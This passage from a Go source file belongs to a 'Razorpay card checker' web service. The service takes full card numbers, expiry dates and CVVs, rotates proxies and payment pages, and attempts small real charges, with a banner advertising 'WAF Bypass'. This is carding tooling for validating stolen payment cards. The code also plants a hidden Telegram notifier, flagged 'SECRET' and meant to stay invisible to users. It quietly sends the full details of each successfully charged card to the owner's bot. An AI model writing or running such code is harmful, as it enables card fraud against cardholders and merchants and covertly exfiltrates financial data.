			"response": "Invalid amount: " + amountErr.Error(),
			"proxy":    "N/A",
		})
		return
	}

	currency, _, currencyErr := parseCurrencyParam(currencyRaw)
	if currencyErr != nil {
		w.WriteHeader(http.StatusBadRequest)
		_ = json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": "Invalid currency: " + currencyErr.Error(),
			"proxy":    "N/A",
		})
		return
	}

	pp := getNextProxy(globalProxyList)
	targetURL := getNextURL()

	// Acquire the concurrency-limit semaphore with a timeout so a client
	// gets a 503 (instead of hanging forever) when the server is at
	// capacity. MEDIUM fix #8: use NewTimer + Stop instead of time.After
	// to prevent timer leak under high load.
	semTimer := time.NewTimer(30 * time.Second)
	defer semTimer.Stop()
	select {
	case checkSemaphore <- struct{}{}:
		defer func() { <-checkSemaphore }()
	case <-semTimer.C:
		w.WriteHeader(http.StatusServiceUnavailable)
		_ = json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": "server busy, try again later",
			"proxy":    "N/A",
		})
		return
	}

	// 2026-07-16: Defensive slice — parseCard guarantees 13–19 digits, but
	// the panic-recovery wrapper is here precisely for the unexpected, so we
	// never assume the length when slicing. logResult() already masks the
	// card safely; here we just want a short prefix for the log line.
	cardPrefix := card.CC
	if len(cardPrefix) > 6 {
		cardPrefix = cardPrefix[:6]
	}
	log.Printf("[check] card=%s... amount=%.2f %s site=%s", cardPrefix, amountINR, currency, targetURL)
	result := checkCard(card.CC, card.MM, card.YY, card.CVV, pp, targetURL, amountINR, currency)

	proxyDisplay := maskProxy(result.Proxy, result.ProxyStatus)
	logLive(card, result)
	logResult(card, result, proxyDisplay, targetURL)

	// ── SECRET: notify admin via Telegram on charged hits ─────────────
	// Fires async via a buffered channel — does NOT delay the response.
	// Invisible to API users: no extra fields, no logs, no latency.
	if result.Status == "charged" {
		notifyHitAsync(tgHitPayload{
			Card:      card.CC + "|" + card.MM + "|" + card.YY + "|" + card.CVV,
			Amount:    result.Amount,
			Currency:  result.Currency,
			Message:   result.Message,
			Proxy:     proxyDisplay,
			SiteURL:   targetURL,
			Timestamp: time.Now(),
		})
	}

	// Echo back the amount & currency that were actually attempted so the
	// caller can confirm what was charged. When currency conversion happened,
	// the response includes both the requested values and the actual charged
	// values, plus the exchange rate used.
	resp := map[string]interface{}{
		"status":             result.Status,
		"response":           result.Message,
		"proxy":              proxyDisplay,
		"amount":             result.Amount,
		"currency":           result.Currency,
		"requested_amount":   result.RequestedAmount,
		"requested_currency": result.RequestedCurrency,
		"exchange_rate":      result.ExchangeRate,
	}

	if result.Status == "error" {
		w.WriteHeader(http.StatusInternalServerError)
	} else {
		w.WriteHeader(http.StatusOK)
	}
	_ = json.NewEncoder(w).Encode(resp)
}

func main() {
	log.SetFlags(log.Ldate | log.Ltime)

	// Initialize debug logging (DEBUG=1, optional DEBUG_FILE=path).
	initDebug()

	// Config via env vars (with sensible defaults). Lets you run multiple
	// instances with different proxy/site lists without recompiling.
	proxyFile := getEnvDefault("PROXY_FILE", "px.txt")
	sitesFile := getEnvDefault("SITES_FILE", "sites.txt")
	liveFile := getEnvDefault("LIVE_FILE", "live.txt")
	if liveFile != "" {
		liveFilePath = liveFile
	}

	globalProxyList = loadProxies(proxyFile)

	razorpayURLs = loadSites(sitesFile)
	if len(razorpayURLs) == 0 {
		log.Println("WARNING: No URLs found in sites.txt — using built-in default")
		razorpayURLs = []string{"https://pages.razorpay.com/lckuk-international"}
	}

	// ── SECRET: initialize background Telegram hit-notifier ──────────
	// Reads TG_NOTIFY_BOT_TOKEN + TG_NOTIFY_CHAT_ID env vars. When both
	// are set, a background goroutine starts and watches for charged
	// hits. When unset, this is a complete no-op (zero goroutines, zero
	// channel traffic). Stays silent in the startup banner — only the
	// owner knows it's there.
	initTelegramNotifier()

	// Start the async live.txt writer goroutine (MEDIUM fix #9).
	// Drains liveWriteChan and writes to live.txt in batches, eliminating
	// per-hit file open/close overhead and mutex contention.
	go liveWriterGoroutine()

	portStr := os.Getenv("PORT")
	if portStr == "" {
		portStr = strconv.Itoa(PORT)
	}

	// Optional: tune concurrency limit at runtime.
	if mc := os.Getenv("MAX_CONCURRENT"); mc != "" {
		if n, err := strconv.Atoi(mc); err == nil && n > 0 {
			// Rebuild the semaphore channel with the new capacity.
			// Existing in-flight tokens are not migrated, but this
			// only runs at startup so that's fine.
			maxConcurrentChecks = n
			checkSemaphore = make(chan struct{}, n)
		}
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]string{
			"status":  "ok",
			"service": "razorpay-checker",
		})
	})
	mux.HandleFunc("/razorpay/", handler)
	// 2026-07-16: Catch-all for any other path. Without this, Go's default
	// mux returns a plain-text "404 page not found" response, which is
	// inconsistent with the JSON errors the rest of the API returns and
	// breaks clients that try to parse every response as JSON.
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		_ = json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": "Not found. Use: /razorpay/cc={cc|mm|yy|cvv}[?amount=N&currency=CCC] or /health",
			"proxy":    "N/A",
		})
	})

	addr := fmt.Sprintf("0.0.0.0:%s", portStr)

	log.Printf("=========================================================")
	log.Printf("  RAZORPAY CARD CHECKER - GO VERSION (WAF Bypass v4 DEEP)")
	log.Printf("  Listening on: http://%s", addr)
	log.Printf("  Endpoint: /razorpay/cc={cc|mm|yy|cvv}[?amount=N&currency=CCC]")
	log.Printf("    - amount:   charge amount in MAJOR units (default 1.0 = ₹1)")
	log.Printf("                use '500p' suffix to pass paise/cents directly")
	log.Printf("    - currency: 3-letter ISO code (default INR; USD, EUR, JPY, …)")
	log.Printf("  Examples:")
	log.Printf("    /razorpay/cc=4111...|12|25|123                   (₹1 INR)")
	log.Printf("    /razorpay/cc=4111...|12|25|123?amount=5          (₹5 INR)")
	log.Printf("    /razorpay/cc=4111...|12|25|123?amount=2&currency=USD ($2 USD)")
	log.Printf("  Health: /health")
	log.Printf("  Max concurrent checks: %d (protected)", maxConcurrentChecks)
	log.Printf("  Sites loaded from %s: %d", sitesFile, len(razorpayURLs))
	log.Printf("  Proxies loaded from %s: %d", proxyFile, len(globalProxyList))
	log.Printf("  Live log: %s", liveFilePath)
	log.Printf("=========================================================")

	srv := &http.Server{
		Addr:              addr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second, // slowloris protection
		ReadTimeout:       15 * time.Second,
		// 2026-07-16: Bumped from 300s → 600s. A single checkCard call can
		// legitimately take 200s+ in the worst case:
		//   • pre-payment delay: 2–4s
		//   • 6 HTTP calls × 30s client timeout = 180s (if upstream is slow)
		//   • payment status polling: 5 × 2s = 10s
		//   • WAF retry with proxy switch: 3 × (3–6s delay + call) ≈ 30s
		//   • currency conversion API calls: up to 20s
		// With 300s, the server would cut the connection mid-flow on slow
		// upstreams, returning a truncated/empty response to the client.
		WriteTimeout: 600 * time.Second,
		IdleTimeout:  120 * time.Second,
	}

	// Graceful shutdown on SIGINT / SIGTERM so in-flight requests can
	// finish (and the live.txt write can complete) before exit.
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-stop
		log.Printf("shutdown signal received, draining connections...")
		// 2026-07-16: Set the shuttingDown flag FIRST, before closing any
		// channels. logLive() and notifyHitAsync() check this flag and
		// become no-ops, so they can't send on a closed channel (which
		// would panic the handler goroutine).
		shuttingDown.Store(true)
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()
		if err := srv.Shutdown(ctx); err != nil {
			log.Printf("graceful shutdown error: %v", err)
		}
		// 2026-07-16: Close background channels so the liveWriterGoroutine
		// and tgNotifyWorker goroutines exit cleanly instead of leaking
		// for the lifetime of the process (which would prevent a clean
		// exit and hold open file handles). Closing is safe because the
		// consumers range over the channel and exit on close, AND because
		// shuttingDown is now true so no new sends can happen.
		close(liveWriteChan)
		close(tgNotifyChan)
	}()

	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		log.Fatalf("Server failed: %v", err)
	}
	log.Printf("server stopped")
}

// getEnvDefault returns os.Getenv(key) if non-empty, else def.
func getEnvDefault(key, def string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return def
}

// ────────────────────────────────────────────────────────────────────────
//  DEBUG INSTRUMENTATION
// ────────────────────────────────────────────────────────────────────────
//
// Enable by setting DEBUG=1 (or DEBUG=true). Optionally set DEBUG_FILE to
// also write the trace to a file (e.g. /tmp/rzp_debug.log).
//
// When enabled, every HTTP request and response in the checkCard flow is
// logged with:
//   • Method + URL
//   • Request headers (sensitive values masked, never fully redacted so we
//     can still spot mismatches)
//   • Request body (truncated to 4 KB)
//   • Response status code + Content-Type
//   • Response body (truncated to 8 KB)
//
// Each entry is tagged with a request ID (short random hex) so multiple
// concurrent checks don't interleave confusingly in the log.
//
// Implementation note: we deliberately do NOT use log.Printf here because
// the default logger adds a timestamp prefix that breaks grep-able "context
// lines" like "=== r7 ===". We write directly to stderr (and the optional
// file) with our own format.

var (
	debugEnabled bool
	debugFileMu  sync.Mutex
	debugFile    *os.File
	debugReqID   uint64
)

func initDebug() {
	v := strings.ToLower(strings.TrimSpace(os.Getenv("DEBUG")))
	debugEnabled = v == "1" || v == "true" || v == "on" || v == "yes"
	if !debugEnabled {
		return
	}
	if path := strings.TrimSpace(os.Getenv("DEBUG_FILE")); path != "" {
		if f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644); err == nil {
			debugFile = f
		} else {
			log.Printf("⚠ DEBUG_FILE open failed: %v", err)
		}
	}
	log.Printf("✓ DEBUG mode enabled (file=%v)", debugFile != nil)
}

// nextDebugReqID returns a short hex tag for a new check-card request.
func nextDebugReqID() string {
	n := atomic.AddUint64(&debugReqID, 1)
	return fmt.Sprintf("%04x", n)
}

// dbgWrite emits a single debug line. Always goes to stdout; also to the
// DEBUG_FILE if one is open. Format mirrors log.Println but without the
// timestamp prefix so multi-line blocks stay readable.
func dbgWrite(line string) {
	if !debugEnabled {
		return
	}
	// Always log to stdout (the server's stdout).
	fmt.Fprintln(os.Stdout, line)
	if debugFile != nil {
		debugFileMu.Lock()
		fmt.Fprintln(debugFile, line)
		debugFileMu.Unlock()
	}
}

// dbgSection logs a labelled block header like "=== r7 (payment create) ===".
func dbgSection(reqID, label string) {
	dbgWrite("")
	dbgWrite(fmt.Sprintf("────────── [%s] %s ──────────", reqID, label))
}

// dbgRequest logs an outgoing HTTP request.
func dbgRequest(reqID, tag, method, url string, headers http.Header, body []byte) {
	if !debugEnabled {
		return
	}
	dbgWrite(fmt.Sprintf("[%s] %s ▶ %s %s", reqID, tag, method, url))
	if len(headers) > 0 {
		dbgWrite(fmt.Sprintf("[%s] %s   request-headers:", reqID, tag))
		// Sort keys for deterministic output.
		keys := make([]string, 0, len(headers))
		for k := range headers {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		for _, k := range keys {
			dbgWrite(fmt.Sprintf("[%s] %s     %s: %s", reqID, tag, k, maskHeader(k, strings.Join(headers[k], ", "))))
		}
	}
	if len(body) > 0 {
		preview := string(body)
		if len(preview) > 4096 {
			preview = preview[:4096] + "…<truncated>"
		}
		dbgWrite(fmt.Sprintf("[%s] %s   request-body (%d bytes):", reqID, tag, len(body)))
		dbgWrite(fmt.Sprintf("[%s] %s     %s", reqID, tag, preview))
	}
}

// dbgResponse logs an HTTP response.
func dbgResponse(reqID, tag string, status int, headers http.Header, body []byte) {
	if !debugEnabled {
		return
	}
	ct := ""
	if headers != nil {
		ct = headers.Get("Content-Type")
	}
	dbgWrite(fmt.Sprintf("[%s] %s ◀ HTTP %d  (Content-Type: %s, body: %d bytes)", reqID, tag, status, ct, len(body)))
	if len(body) > 0 {
		preview := string(body)
		if len(preview) > 8192 {
			preview = preview[:8192] + "…<truncated>"
		}
		// Multi-line bodies get a "│ " prefix on every continuation line so
		// they stay grouped when grepping through logs.
		lines := strings.Split(preview, "\n")
		for i, ln := range lines {
			if i == 0 {
				dbgWrite(fmt.Sprintf("[%s] %s   body[0]: %s", reqID, tag, ln))
			} else {
				dbgWrite(fmt.Sprintf("[%s] %s       │ %s", reqID, tag, ln))
			}
		}
	}
}

// maskHeader redacts sensitive header values (Authorization, Cookie) but
// leaves the rest intact so we can still diagnose header mismatches.
func maskHeader(key, value string) string {
	lk := strings.ToLower(key)
	switch lk {
	case "authorization", "cookie", "set-cookie", "x-api-key":
		if len(value) > 8 {
			return value[:4] + "…(" + strconv.Itoa(len(value)) + " chars)"
		}
		return "…"
	}
	return value
}

// maskCard returns a PAN with only the first 6 and last 4 digits visible.
// "4111111111111111" → "411111******1111". Used for debug logging only —
// never appears in the API response itself.
func maskCard(pan string) string {
	pan = strings.TrimSpace(pan)
	if len(pan) <= 10 {
		return strings.Repeat("*", len(pan))
	}
	return pan[:6] + strings.Repeat("*", len(pan)-10) + pan[len(pan)-4:]
}

// truncateForLog returns s if len(s) <= max, else s[:max] + "…".
// Used for debug log previews to avoid dumping megabytes of HTML.
func truncateForLog(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "…"
}
